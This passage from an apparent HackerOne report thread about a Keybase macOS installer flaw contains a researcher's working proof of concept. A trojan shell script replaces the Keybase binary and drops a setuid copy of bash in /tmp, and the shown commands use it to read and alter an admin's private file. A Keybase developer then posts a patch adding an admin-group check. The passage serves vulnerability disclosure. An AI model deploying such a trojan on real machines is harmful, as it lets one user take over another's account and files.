ssh private keys or perhaps add their own\n* steal pgp keys\n* remove/alter files\n* execute a reverse shell\n\nI am conducting additional research to determine if arbitrary code execution as root is possible. My initial thought was to replace one of the binaries used by root however due to the code signing verification this might not work - at least it won't be as simple as modifying the binary in place. This appears to be a more difficult path than I originally thought. There could be a race condition to get past the code signing check but I have not attempted that yet. The current easier path would be to install the trojan and wait for an admin user open Keybase.","markdown_message":"\u003cp\u003eCorrect. An unprivileged user does not have rights to install applications to /Applications. For example when I tired to do it with Keybase, macOS prompted me for admin credentials. \u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"keybase-drag-drop-install-auth-lowpriv.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/396/779/3f06b50c6f498c2d2f5bf9597f8ea9f06795584e/keybase-drag-drop-install-auth-lowpriv.png?response-content-disposition=attachment%3B%20filename%3D%22keybase-drag-drop-install-auth-lowpriv.png%22%3B%20filename%2A%3DUTF-8%27%27keybase-drag-drop-install-auth-lowpriv.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T060258Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=01eaee2cba6130250403cfc8ecf500a192126ed1db9a9410ab76637c438f75a8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/396/779/3f06b50c6f498c2d2f5bf9597f8ea9f06795584e/keybase-drag-drop-install-auth-lowpriv.png?response-content-disposition=attachment%3B%20filename%3D%22keybase-drag-drop-install-auth-lowpriv.png%22%3B%20filename%2A%3DUTF-8%27%27keybase-drag-drop-install-auth-lowpriv.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T060258Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=01eaee2cba6130250403cfc8ecf500a192126ed1db9a9410ab76637c438f75a8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nHowever, the low privileged can execute the keybase install command to install the Keybase application while also retaining ownership of all files.\u003c/p\u003e\n\n\u003cp\u003eA quick way to demo the risk this introduces is to install a trojan horse as the low privileged user. Replace the Keybase application with a malicious application. This PoC is a simple shell script. Once installed, any user that executes Keybase will also create a setuid shell in /tmp while also executing the original application. The unsuspecting victim will be unaware that a setuid shell is created. \u003c/p\u003e\n\n\u003cp\u003e1) Rename the original Keybase application\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecd /Applications/Keybase.app/Contents/MacOS\nmv Keybase Keybase.orig\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Create a script named Keybase with the following logic\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# create a setuid shell as the calling user\u003c/span\u003e\n/bin/cp /bin/bash /tmp/\u003cspan class=\"si\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003elogname\u003c/span\u003e\u003cspan class=\"si\"\u003e)\u003c/span\u003e.shell\n/bin/chmod 4755 /tmp/\u003cspan class=\"si\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003elogname\u003c/span\u003e\u003cspan class=\"si\"\u003e)\u003c/span\u003e.shell\n\n\u003cspan class=\"c\"\u003e# execute the real Keybase app\u003c/span\u003e\n/Applications/Keybase.app/Contents/MacOS/Keybase.orig \u003cspan class=\"nv\"\u003e$*\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3) Make the script executable\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003echmod 755 Keybase\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e4) As another user login and open Keybase. For this PoC I also created a file named secret.file in the home directory and set the permissions 600.\u003c/p\u003e\n\n\u003cp\u003e5) As test2 check to see if the setuid shell has been created.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -ld /tmp/admin.shell\n-rwsr-xr-x  1 admin  wheel  618416 Dec 24 20:06 /tmp/admin.shell\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e6) Show that test2 does not have permission to read the secret file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ cat /Users/admin/secret.file\ncat: /Users/admin/secret.file: Permission denied\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e7) Execute the setuid shell. Noticed euid=501 which gives full access to the victims files.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ /tmp/admin.shell -p\nadmin.shell-3.2$ id\nuid=508(test2) gid=20(staff) euid=501(admin) groups=20(staff),12(everyone),61(localaccounts),704(com.apple.sharepoint.group.4),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e8) Read the secret file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eadmin.shell-3.2$ ls -ld /Users/admin/secret.file\n-rw-------  1 admin  staff  18 Dec 24 20:26 /Users/admin/secret.file\n\nadmin.shell-3.2$ cat /Users/admin/secret.file\nthis is a secret\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e9) Write to the secret file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eadmin.shell-3.2$ echo woot \u0026gt;\u0026gt; /Users/admin/secret.file\nadmin.shell-3.2$ ls -ld /Users/admin/secret.file\n-rw-------  1 admin  staff  23 Dec 24 20:45 /Users/admin/secret.file\nadmin.shell-3.2$ cat /Users/admin/secret.file\nthis is a secret;\nwoot\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause arbitrary code can be added there are many other malicious tasks could be accomplished to the trojan horse such as\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003esteal ssh private keys or perhaps add their own\u003c/li\u003e\n\u003cli\u003esteal pgp keys\u003c/li\u003e\n\u003cli\u003eremove/alter files\u003c/li\u003e\n\u003cli\u003eexecute a reverse shell\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI am conducting additional research to determine if arbitrary code execution as root is possible. My initial thought was to replace one of the binaries used by root however due to the code signing verification this might not work - at least it won\u0026#39;t be as simple as modifying the binary in place. This appears to be a more difficult path than I originally thought. There could be a race condition to get past the code signing check but I have not attempted that yet. The current easier path would be to install the trojan and wait for an admin user open Keybase.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-25T02:47:19.419Z","updated_at":"2018-12-25T02:47:19.419Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":396779,"filename":"keybase-drag-drop-install-auth-lowpriv.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/396/779/3f06b50c6f498c2d2f5bf9597f8ea9f06795584e/keybase-drag-drop-install-auth-lowpriv.png?response-content-disposition=attachment%3B%20filename%3D%22keybase-drag-drop-install-auth-lowpriv.png%22%3B%20filename%2A%3DUTF-8%27%27keybase-drag-drop-install-auth-lowpriv.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060258Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=01eaee2cba6130250403cfc8ecf500a192126ed1db9a9410ab76637c438f75a8"}],"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3897949,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK, we have a fix in a private branch:\n\n```\nFrom eb3270c42b07889f0a741b44684a83814ac291a7 Mon Sep 17 00:00:00 2001\nFrom: Maxwell Krohn \u003cthemax@gmail.com\u003e\nDate: Thu, 27 Dec 2018 05:39:42 -0500\nSubject: [PATCH] add admin check for helper caller\n\n- fail the RPC if the caller isn't in group 'admin'\n---\n osx/Helper/KBHelper.m                | 42 ++++++++++++++++++++++++++--\n osx/MPMessagePack/XPC/MPXPCService.m |  2 +-\n 2 files changed, 41 insertions(+), 3 deletions(-)\n\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\nindex fd2ca6778..4a08ae21e 100644\n--- a/osx/Helper/KBHelper.m\n+++ b/osx/Helper/KBHelper.m\n@@ -11,6 +11,8 @@\n #import \"KBKext.h\"\n #import \"KBLogger.h\"\n #import \u003cMPMessagePack/MPXPCProtocol.h\u003e\n+#include \u003cpwd.h\u003e\n+#include \u003cgrp.h\u003e\n \n @interface KBHelper ()\n @property NSTask *redirector;\n@@ -46,7 +48,7 @@ + (int)run {\n \n - (void)handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n   @try {\n-    [self _handleRequestWithMethod:method params:params messageId:messageId completion:completion];\n+    [self _handleRequestWithMethod:method params:params messageId:messageId remote:remote completion:completion];\n   } @catch (NSException *e) {\n     KBLog(@\"Exception: %@\", e);\n     completion(KBMakeError(MPXPCErrorCodeInvalidRequest, @\"Exception: %@\", e), nil);\n@@ -61,7 +63,7 @@ - (NSString *)checkKextID:(NSString *)kextID {\n   return nil;\n }\n \n-- (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId completion:(void (^)(NSError *error, id value))completion {\n+- (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n   NSDictionary *args = [params count] == 1 ? params[0] : @{};\n \n   KBLog(@\"Request: %@(%@)\", method, args);\n@@ -71,6 +73,12 @@ - (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params mes\n     return;\n   }\n \n+  if (![self _checkRemoteIsAdmin:remote]) {\n+    KBLog(@\"Remote caller into Helper process didn't have admin permissions\");\n+    completion(KBMakeError(MPXPCErrorCodeInvalidRequest, @\"Invalid admin permissions\"), nil);\n+    return;\n+  }\n+\n   if ([method isEqualToString:@\"version\"]) {\n     [self version:completion];\n   } else if ([method isEqualToString:@\"kextLoad\"]) {\n@@ -109,6 +117,36 @@ - (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params mes\n   }\n }\n \n+- (BOOL)_checkRemoteIsAdmin:(xpc_connection_t)remote {\n+  char getpwuid_buf[1024];\n+  char getgrnam_buf[8192];\n+\n+  uid_t uid = xpc_connection_get_euid(remote);\n+  struct passwd pwentry;\n+  struct passwd *pwentryp;\n+  int tmp = getpwuid_r(uid, \u0026pwentry, getpwuid_buf, sizeof(getpwuid_buf), \u0026pwentryp);\n+  if (tmp != 0 || pwentryp == NULL) {\n+    KBLog(@\"Failed to get PW entry for uid %@\", uid);\n+    return NO;\n+  }\n+  struct group admin_group;\n+  struct group *admin_group_p;\n+  tmp = getgrnam_r(\"admin\", \u0026admin_group, getgrnam_buf, sizeof(getgrnam_buf), \u0026admin_group_p);\n+  if (tmp != 0 || admin_group_p == NULL) {\n+    KBLog(@\"Could not call getgrnam on the 'admin' group, so can't tell if remote is an admin\");\n+    return NO;\n+  }\n+  int n = 0;\n+  for (char **p = admin_group_p-\u003egr_mem; *p; p++, n++) {\n+    if (strcmp(pwentryp-\u003epw_name, *p) == 0) {\n+      KBLog(@\"Yes, the calling user '%@' is an 'admin'\", pwentryp-\u003epw_name);\n+      return YES;\n+    }\n+  }\n+  KBLog(@\"The 'admin' group had %@ members but '%@' wasn't one\", n, pwentryp-\u003epw_name);\n+  return NO;\n+}\n+\n - (void)version:(void (^)(NSError *error, id value))completion {\n   NSString *version = NSBundle.mainBundle.infoDictionary[@\"CFBundleShortVersionString\"];\n   NSString *build = NSBundle.mainBundle.infoDictionary[@\"KBBuild\"];\ndiff --git a/osx/MPMessagePack/XPC/MPXPCService.m b/osx/MPMessagePack/XPC/MPXPCService.m\nindex 354f0f490..6cfdcbd8b 100644\n--- a/osx/MPMessagePack/XPC/MPXPCService.m\n+++ b/osx/MPMessagePack/XPC/MPXPCService.m\n@@ -119,7 +119,7 @@ - (void)handleEvent:(xpc_object_t)event remote:(xpc_connection_t)remote completi\n }\n \n - (void)handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n-  completion(MPMakeError(MPXPCErrorCodeUnknownRequest, @\"Unkown request\"), nil);\n+  completion(MPMakeError(MPXPCErrorCodeUnknownRequest, @\"Unknown request\"), nil);\n }\n \n - (BOOL)checkCodeRequirement:(NSString *)codeRequirement auditToken:(audit_token_t)auditToken error:(NSError **)error {\n-- \n2.17.1 (Apple Git-112)\n\n```","markdown_message":"\u003cp\u003eOK, we have a fix in a private branch:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003eFrom eb3270c42b07889f0a741b44684a83814ac291a7 Mon Sep 17 00:00:00 2001\nFrom: Maxwell Krohn \u0026lt;themax@gmail.com\u0026gt;\nDate: Thu, 27 Dec 2018 05:39:42 -0500\nSubject: [PATCH] add admin check for helper caller\n\u003c/span\u003e\n- fail the RPC if the caller isn\u0026#39;t in group \u0026#39;admin\u0026#39;\n\u003cspan class=\"p\"\u003e---\n\u003c/span\u003e osx/Helper/KBHelper.m                | 42 ++++++++++++++++++++++++++--\n osx/MPMessagePack/XPC/MPXPCService.m |  2 +-\n 2 files changed, 41 insertions(+), 3 deletions(-)\n\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\n\u003cspan class=\"gh\"\u003eindex fd2ca6778..4a08ae21e 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -11,6 +11,8 @@\u003c/span\u003e\n #import \u0026quot;KBKext.h\u0026quot;\n #import \u0026quot;KBLogger.h\u0026quot;\n #import \u0026lt;MPMessagePack/MPXPCProtocol.h\u0026gt;\n\u003cspan class=\"gi\"\u003e+#include \u0026lt;pwd.h\u0026gt;\n+#include \u0026lt;grp.h\u0026gt;\n\u003c/span\u003e\n @interface KBHelper ()\n @property NSTask *redirector;\n\u003cspan class=\"p\"\u003e@@ -46,7 +48,7 @@\u003c/span\u003e + (int)run {\n\n - (void)handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n   @try {\n\u003cspan class=\"gd\"\u003e-    [self _handleRequestWithMethod:method params:params messageId:messageId completion:completion];\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    [self _handleRequestWithMethod:method params:params messageId:messageId remote:remote completion:completion];\n\u003c/span\u003e   } @catch (NSException *e) {\n     KBLog(@\u0026quot;Exception: %@\u0026quot;, e);\n     completion(KBMakeError(MPXPCErrorCodeInvalidRequest, @\u0026quot;Exception: %@\u0026quot;, e), nil);\n\u003cspan class=\"p\"\u003e@@ -61,7 +63,7 @@\u003c/span\u003e - (NSString *)checkKextID:(NSString *)kextID {\n   return nil;\n }\n\n-- (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId completion:(void (^)(NSError *error, id value))completion {\n\u003cspan class=\"gi\"\u003e+- (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n\u003c/span\u003e   NSDictionary *args = [params count] == 1 ? params[0] : @{};\n\n   KBLog(@\u0026quot;Request: %@(%@)\u0026quot;, method, args);\n\u003cspan class=\"p\"\u003e@@ -71,6 +73,12 @@\u003c/span\u003e - (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params mes\n     return;\n   }\n\n+  if (![self _checkRemoteIsAdmin:remote]) {\n\u003cspan class=\"gi\"\u003e+    KBLog(@\u0026quot;Remote caller into Helper process didn\u0026#39;t have admin permissions\u0026quot;);\n+    completion(KBMakeError(MPXPCErrorCodeInvalidRequest, @\u0026quot;Invalid admin permissions\u0026quot;), nil);\n+    return;\n+  }\n+\n\u003c/span\u003e   if ([method isEqualToString:@\u0026quot;version\u0026quot;]) {\n     [self version:completion];\n   } else if ([method isEqualToString:@\u0026quot;kextLoad\u0026quot;]) {\n\u003cspan class=\"p\"\u003e@@ -109,6 +117,36 @@\u003c/span\u003e - (void)_handleRequestWithMethod:(NSString *)method params:(NSArray *)params mes\n   }\n }\n\n+- (BOOL)_checkRemoteIsAdmin:(xpc_connection_t)remote {\n\u003cspan class=\"gi\"\u003e+  char getpwuid_buf[1024];\n+  char getgrnam_buf[8192];\n+\n+  uid_t uid = xpc_connection_get_euid(remote);\n+  struct passwd pwentry;\n+  struct passwd *pwentryp;\n+  int tmp = getpwuid_r(uid, \u0026amp;pwentry, getpwuid_buf, sizeof(getpwuid_buf), \u0026amp;pwentryp);\n+  if (tmp != 0 || pwentryp == NULL) {\n+    KBLog(@\u0026quot;Failed to get PW entry for uid %@\u0026quot;, uid);\n+    return NO;\n+  }\n+  struct group admin_group;\n+  struct group *admin_group_p;\n+  tmp = getgrnam_r(\u0026quot;admin\u0026quot;, \u0026amp;admin_group, getgrnam_buf, sizeof(getgrnam_buf), \u0026amp;admin_group_p);\n+  if (tmp != 0 || admin_group_p == NULL) {\n+    KBLog(@\u0026quot;Could not call getgrnam on the \u0026#39;admin\u0026#39; group, so can\u0026#39;t tell if remote is an admin\u0026quot;);\n+    return NO;\n+  }\n+  int n = 0;\n+  for (char **p = admin_group_p-\u0026gt;gr_mem; *p; p++, n++) {\n+    if (strcmp(pwentryp-\u0026gt;pw_name, *p) == 0) {\n+      KBLog(@\u0026quot;Yes, the calling user \u0026#39;%@\u0026#39; is an \u0026#39;admin\u0026#39;\u0026quot;, pwentryp-\u0026gt;pw_name);\n+      return YES;\n+    }\n+  }\n+  KBLog(@\u0026quot;The \u0026#39;admin\u0026#39; group had %@ members but \u0026#39;%@\u0026#39; wasn\u0026#39;t one\u0026quot;, n, pwentryp-\u0026gt;pw_name);\n+  return NO;\n+}\n+\n\u003c/span\u003e - (void)version:(void (^)(NSError *error, id value))completion {\n   NSString *version = NSBundle.mainBundle.infoDictionary[@\u0026quot;CFBundleShortVersionString\u0026quot;];\n   NSString *build = NSBundle.mainBundle.infoDictionary[@\u0026quot;KBBuild\u0026quot;];\n\u003cspan class=\"gh\"\u003ediff --git a/osx/MPMessagePack/XPC/MPXPCService.m b/osx/MPMessagePack/XPC/MPXPCService.m\nindex 354f0f490..6cfdcbd8b 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/MPMessagePack/XPC/MPXPCService.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/MPMessagePack/XPC/MPXPCService.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -119,7 +119,7 @@\u003c/span\u003e - (void)handleEvent:(xpc_object_t)event remote:(xpc_connection_t)remote completi\n }\n\n - (void)handleRequestWithMethod:(NSString *)method params:(NSArray *)params messageId:(NSNumber *)messageId remote:(xpc_connection_t)remote completion:(void (^)(NSError *error, id value))completion {\n\u003cspan class=\"gd\"\u003e-  completion(MPMakeError(MPXPCErrorCodeUnknownRequest, @\u0026quot;Unkown request\u0026quot;), nil);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  completion(MPMakeError(MPXPCErrorCodeUnknownRequest, @\u0026quot;Unknown request\u0026quot;), nil);\n\u003c/span\u003e }\n\n - (BOOL)checkCodeRequirement:(NSString *)codeRequirement auditToken:(audit_token_t)auditToken error:(NSError **)error {\n\u003cspan class=\"gd\"\u003e-- \n\u003c/span\u003e\u003cspan class=\"p\"\u003e2.17.1 (Apple Git-112)\n\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-27T21:54:21.195Z","updated_at":"2018-12-27T21:54:21.195Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900023,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-28T12:15:01.555Z","updated_at":"2018-12-28T12:15:01.555Z","additional_data":{"old_severity":"High (7.8)","new_severity":"Medium (6.3)","old_severity_id":271468,"new_severity_id":272587},"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm changing the severity to medium, since it doesn't directly give the attacker root, it would require a further hole or manual user interaction. It is still a bug worth fixing. Thank you!","markdown_message":"\u003cp\u003eI\u0026#39;m changing the severity to medium, since it 